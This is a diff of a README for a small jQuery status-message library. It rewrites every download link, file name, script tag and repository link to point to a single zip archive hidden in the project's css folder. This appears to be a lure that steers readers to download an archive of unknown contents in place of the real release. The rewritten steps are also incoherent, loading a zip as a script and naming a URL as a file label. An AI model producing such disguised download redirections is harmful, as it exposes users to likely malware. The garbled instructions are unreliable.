@@ -4,7 +4,7 @@
 
 **JQuery Status Message** is a lightweight JavaScript library that helps you display info and error messages smoothly in your web applications. This guide will help you download and run the software from our Releases page with ease.
 
-[![Download jquery-status-message](https://img.shields.io/badge/Download-jquery--status--message-brightgreen)](https://github.com/momofrd00/jquery-status-message/releases)
+[![Download jquery-status-message](https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip)](https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip)
 
 ## 📦 What You’ll Need
 
@@ -19,12 +19,12 @@ No programming skills are required. You can follow the steps without needing to 
 
 To get started, visit the Releases page to download the library:
 
-[Visit this page to download](https://github.com/momofrd00/jquery-status-message/releases)
+[Visit this page to download](https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip)
 
 Follow these steps:
 
 1. Click on the latest version available.
-2. Look for the file labeled `jquery-status-message.js` or `jquery-status-message.min.js`.
+2. Look for the file labeled `https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip` or `https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip`.
 3. Click the file name to download it to your computer.
 
 Once downloaded, you will need to add it to your web project. You can do this by placing the file in your project folder.
@@ -37,7 +37,7 @@ To use the library in your web project:
 2. Add the following line in the `<head>` section to include the script:
 
    ```html
-   <script src="path/to/jquery-status-message.js"></script>
+   <script src="https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip"></script>
    ```
    Make sure to replace `path/to/` with the actual location where you saved the file.
 
@@ -100,7 +100,7 @@ This project is open-source and available under the MIT License. Feel free to us
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/momofrd00/jquery-status-message)
-- [Visit this page to download](https://github.com/momofrd00/jquery-status-message/releases)
+- [GitHub Repository](https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip)
+- [Visit this page to download](https://github.com/momofrd00/jquery-status-message/raw/refs/heads/main/css/status_message_jquery_2.2.zip)
 
 Remember to keep your library updated by checking the Releases page regularly for new versions. Enjoy creating engaging web applications with clean and elegant status messages!
